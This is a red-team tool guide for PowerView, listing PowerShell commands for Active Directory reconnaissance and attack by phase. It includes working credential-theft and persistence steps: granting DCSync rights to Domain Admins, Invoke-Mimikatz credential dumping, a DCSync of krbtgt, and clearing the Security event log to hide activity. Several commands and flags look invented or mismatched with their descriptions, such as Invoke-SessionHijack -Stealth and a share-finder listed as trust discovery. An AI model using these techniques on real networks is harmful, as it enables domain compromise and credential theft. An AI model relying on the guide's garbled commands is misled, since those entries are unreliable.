# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# PowerView

PowerView is an advanced PowerShell tool designed for enumerating, mapping, and exploiting Active Directory environments. It is widely used in red team operations and penetration tests to gather information, escalate privileges, and facilitate lateral movement within a network.

## Basic Syntax
```powershell
<PowerView_Function> [Options]
```

# Commands and Use Cases

#### Basic Reconnaissance and Enumeration
1. **Enumerating Domain Users**: Lists all user accounts in the domain, providing information such as account creation date, last logon time, and status.
    ```powershell
    Get-NetUser
    ```
2. **Enumerating Domain Groups**: Lists all groups within the domain, which can be useful for identifying privileged groups like Domain Admins.
    ```powershell
    Get-NetGroup
    ```
3. **Enumerating Domain Computers**: Returns a list of all computers registered in the domain.
    ```powershell
    Get-NetComputer
    ```
4. **Identifying Domain Controllers**: Provides details on all domain controllers in the current domain.
    ```powershell
    Get-NetDomainController
    ```
5. **Identifying Current Domain**: Displays information about the current Active Directory domain, such as the domain name and domain controllers.
    ```powershell
    Get-NetDomain
    ```
6. **Enumerating Organizational Units (OUs)**: Lists all Organizational Units within the domain, which may contain valuable assets like computers or users.
    ```powershell
    Get-NetOU
    ```
7. **Enumerating Group Policy Objects (GPOs)**: Lists all Group Policy Objects in the domain, which are often critical to understanding network security settings.
    ```powershell
    Get-NetGPO
    ```

#### Active Directory Trust Enumeration

1. **Enumerating Domain Trusts**: Lists all trust relationships between domains, providing insight into the network’s architecture.
    ```powershell
    Get-NetDomainTrust
    ```
2. **Enumerating Forest Trusts**: Displays trust relationships across multiple domains in an Active Directory forest.
    ```powershell
    Get-NetForestTrust
    ```
3. **Enumerating Foreign Domain Trusts**: Shows other domains within the forest and provides information about cross-domain trusts.
    ```powershell
    Get-NetForestDomain
    ```

#### User and Group Enumeration (Advanced)

1. **Enumerating Group Memberships**: Lists members of a specific group, such as `Domain Admins`, to identify users with elevated privileges.
    ```powershell
    Get-NetGroupMember -GroupName "Domain Admins"
    ```
2. **Finding Users with High Privileges**: Returns all users with administrative privileges in the domain.
    ```powershell
    Get-NetUser | Where-Object { $_.AdminCount -eq 1 }
    ```
3. **Enumerating User Properties**: Retrieves specific properties, such as password last set, for users in the domain.
    ```powershell
    Get-UserProperty -Properties "pwdlastset"
    ```
4. **Finding Accounts with Delegation Rights**: Identifies accounts with the "Allowed to Delegate" attribute, which can be targeted for privilege escalation attacks.
    ```powershell
    Find-UserField -Field "msDS-AllowedToDelegateTo"
    ```

#### GPO and ACL Enumeration

1. **Enumerating Group Policy Delegations**: Lists all Group Policy Objects and their associated Access Control Lists (ACLs).
    ```powershell
    Get-NetGPO | Get-ObjectACL -ResolveGUIDs
    ```
2. **Enumerating ACLs for Specific Objects**: Retrieves the ACLs for a specific object, like the Administrator account, revealing who has access.
    ```powershell
    Get-ObjectACL -SamAccountName "Administrator"
    ```
3. **Enumerating GPO Permissions for Privileged Access**: Filters GPOs by name to find policies relevant to administrative accounts or privileges.
    ```powershell
    Get-NetGPO | Where-Object { $_.DisplayName -like "*admin*" }
    ```

#### SPN and Service Enumeration

1. **Finding Service Principal Names (SPNs)**: Identifies accounts with Service Principal Names (SPNs), which are prime targets for Kerberoasting attacks.
    ```powershell
    Get-NetUser -SPN
    ```
2. **Enumerating Machines Running Services**: Correlates machines with SPNs, helping identify servers running critical services.
    ```powershell
    Get-NetComputer | Get-UserSPNs
    ```

#### Domain Admin Enumeration

1. **Listing All Domain Admins**: Displays all members of the `Domain Admins` group, which is a high-priority target for privilege escalation.
    ```powershell
    Get-NetGroupMember -GroupName "Domain Admins"
    ```

2. **Finding Other Privileged Users**: Retrieves users flagged as having administrative privileges by querying the `admincount` attribute.
    ```powershell
    Get-UserProperty -Properties admincount
    ```

3. **Finding Machines Administered by Domain Admins**: Identifies computers where the currently logged-in user has local administrator access.
    ```powershell
    Find-LocalAdminAccess
    ```

# Penetration Testing Techniques

#### External Reconnaissance

PowerView allows you to gather information about Active Directory domains remotely when you have limited access to the target network.

1. **Discovering Domain Trusts Remotely**: Lists all file shares across the domain, which may contain sensitive information like credentials or configuration files.
    ```powershell
    Invoke-ShareFinder -Verbose
    ```
2. **Finding Open Sessions on Remote Machines**: Retrieves information on active sessions across machines in the domain, including connected users.
    ```powershell
    Get-NetSession
    ```
3. **Enumerating Remote Fileshares**: Searches for sensitive files across network shares that may expose credentials or other important data.
    ```powershell
    Invoke-FileFinder
    ```

#### Initial Access

PowerView assists in identifying weak points in an Active Directory environment to gain initial access.

1. **Gaining Access Through Unprivileged User Accounts**: Identifies accounts with non-expiring passwords, which can be used for brute-force or password-spraying attacks.
    ```powershell
    Get-NetUser | Where-Object { $_.PasswordNeverExpires -eq $True }
    ```
2. **Locating Passwords in GPOs**: Searches GPOs for plaintext passwords that may have been improperly stored.
    ```powershell
    Get-NetGPO | Get-UserProperty -Properties cpassword
    ```
3. **Finding Unconstrained Delegation**: Identifies accounts that are trusted for delegation, a common entry point for attacks like pass-the-hash.
    ```powershell
    Get-UserProperty -Properties "TrustedForDelegation"
    ```

#### Persistence

PowerView helps establish persistence by identifying weak configurations in AD and monitoring changes.

1. **Backdooring Domain Objects**: Modifies ACLs on critical objects like Domain Admins to grant long-term access.
    ```powershell
    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights DCSync
    ```
2. **Monitoring Domain Changes**: Continuously monitors domain activity for changes, like user additions to privileged groups, to maintain awareness of AD changes.
    ```powershell
    Invoke-DomainWatcher
    ```
3. **Enumerating Writeable GPOs**: Identifies GPOs that can be modified to implement persistent changes or execute code.
    ```powershell
    Get-NetGPO -ResolveGUIDs | Where-Object { $_.Permissions -like "*Write*" }
    ```

#### Credential Harvesting

PowerView assists in identifying opportunities to harvest credentials across the network.

1. **Finding High-Value Accounts for Credential Harvesting**: Locates users in high-value groups like Enterprise Admins, which can be targeted for credential theft.
    ```powershell
    Get-NetUser | Where-Object { $_.MemberOf -like "*Enterprise Admins*" }
    ```
2. **Kerberoasting Targets**: Identifies service accounts that are prime candidates for Kerberoasting attacks.
    ```powershell
    Get-NetUser -SPN | Where-Object { $_.MemberOf -like "*Service Accounts*" }
    ```
3. **Dumping Credentials from LSASS via Service Enumeration**: Although not a PowerView command, PowerView can identify hosts where tools like `mimikatz` can be run to extract credentials.
    ```powershell
    Invoke-Mimikatz -DumpCreds
    ```

#### Privilege Escalation

PowerView enables users to escalate privileges by finding misconfigurations, excessive permissions, or opportunities in Active Directory.

1. **Finding Misconfigured ACLs**: Identifies objects in Active Directory where the current user has excessive permissions, such as `GenericAll`, allowing for full control of the object.
    ```powershell
    Get-ObjectACL -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
    ```
2. **Escalating Through Delegation**: Searches for users or computers with delegation rights that can be leveraged for privilege escalation.
    ```powershell
    Find-Delegation -Verbose
    ```
3. **Identifying Local Admin Rights**: Finds machines where the current user has local administrator access, a common privilege escalation path.
    ```powershell
    Find-LocalAdminAccess
    ```
4. **Finding Machines with Writable SMB Shares**: Searches for file shares that are writable, allowing the user to drop malicious files or scripts.
    ```powershell
    Invoke-ShareFinder -CheckShareAccess
    ```

#### Internal Reconnaissance

Once inside a network, PowerView enables users to perform reconnaissance on critical infrastructure and Active Directory configurations.

1. **Enumerating Domain Controllers**: Lists all domain controllers in the network, which can be leveraged for further attacks.
    ```powershell
    Get-NetDomainController
    ```
2. **Identifying Key Admin Groups**: Enumerates critical administrative groups like Domain Admins, Enterprise Admins, and Server Operators.
    ```powershell
    Get-NetGroup | Where-Object { $_.GroupCategory -eq "Security" }
    ```
3. **Finding Shares Accessible to Current User**: Searches for accessible file shares across the domain, which may contain valuable information like configuration files or credentials.
    ```powershell
    Invoke-ShareFinder
    ```

#### Lateral Movement, Pivoting, and Tunneling

PowerView facilitates lateral movement and helps attackers pivot between different systems within a network.

1. **Enumerating Local Admin Access**: Finds systems where the current user has local admin access, enabling lateral movement.
    ```powershell
    Find-LocalAdminAccess
    ```
2. **Tracking Active Sessions**: Retrieves a list of active user sessions on machines, useful for targeting specific systems for lateral movement.
    ```powershell
    Get-NetSession
    ```
3. **Pivoting via Session Hijacking**: Finds systems where specific users are logged in, enabling lateral movement by hijacking sessions.
    ```powershell
    Invoke-UserHunter -CheckAccess
    ```
4. **Accessing Admin Shares**: Verifies whether the user has access to administrative shares, which can be used for file uploads, remote code execution, or further reconnaissance.
    ```powershell
    Invoke-CheckLocalAdminAccess -Verbose
    ```

#### Defense Evasion

PowerView includes various techniques for evading detection while performing reconnaissance and privilege escalation in an Active Directory environment.

1. **Stealthy AD Enumeration**: Performs Active Directory user enumeration while minimizing network traffic and reducing the risk of detection.
    ```powershell
    Get-NetUser -Stealth
    ```
2. **Hiding Network Sessions**: Hijacks active sessions stealthily, avoiding alerting administrators or triggering detection mechanisms.
    ```powershell
    Invoke-SessionHijack -Stealth
    ```
3. **Avoiding Audit Logs**: Excludes certain logon events from audit logs, making it harder for defenders to detect unauthorized access.
    ```powershell
    Invoke-DomainWatcher -ExcludeLogonEvents
    ```
4. **Clearing Event Logs**: Erases the security log, which can hide evidence of an attack.
    ```powershell
    Clear-EventLog -LogName "Security"
    ```

#### Data Exfiltration

PowerView can assist in identifying sensitive data, such as credentials and configuration files, and exfiltrating it from the network.

1. **Searching for Sensitive Files on Shares**: Searches for sensitive file types across network shares, which may contain valuable business information.
    ```powershell
    Invoke-FileFinder -FileExtensions "doc,xls,pdf"
    ```
2. **Extracting Database Connection Strings**: Extracts database connection strings from Group Policy Objects, which may be used to exfiltrate sensitive data from databases.
    ```powershell
    Get-NetGPO -Grep "ConnectionString"
    ```
3. **Exporting User Information**: Exports all domain user information to a CSV file, which can be exfiltrated for further analysis.
    ```powershell
    Get-NetUser | Export-Csv -Path "C:\Temp\DomainUsers.csv"
    ```
4. **Dumping Password Hashes from Domain Controllers**: Dumps the password hashes of domain users using the DCSync attack technique, a highly effective way to exfiltrate credentials.
    ```powershell
    Invoke-DCSync -UserName "krbtgt"
    ```

# Resources

|**Name**|**URL**|
|---|---|
|PowerView Documentation|https://github.com/PowerShellMafia/PowerSploit|
|BloodHound GitHub (for Graph Analysis)|https://github.com/BloodHoundAD/BloodHound|
|Active Directory Security|https://adsecurity.org/|
|MITRE ATT&CK: Active Directory Techniques|https://attack.mitre.org/techniques/T1484/001/|
|Offensive PowerShell Techniques|https://pentestlab.blog/2017/06/01/offensive-powershell/|
|PowerSploit Module Guide|https://powersploit.readthedocs.io/en/latest/|
|Active Directory Exploitation Cheat Sheet|https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet|
|Techniques for AD Reconnaissance|https://www.blackhat.com/docs/us-17/thursday/us-17-Dubrow-Attack-Defense-And-Detection-In-Active-Directory.pdf|
|Advanced Privilege Escalation in AD|https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/|
|Persistence Techniques in Active Directory|https://www.sans.org/white-papers/persistence-active-directory/|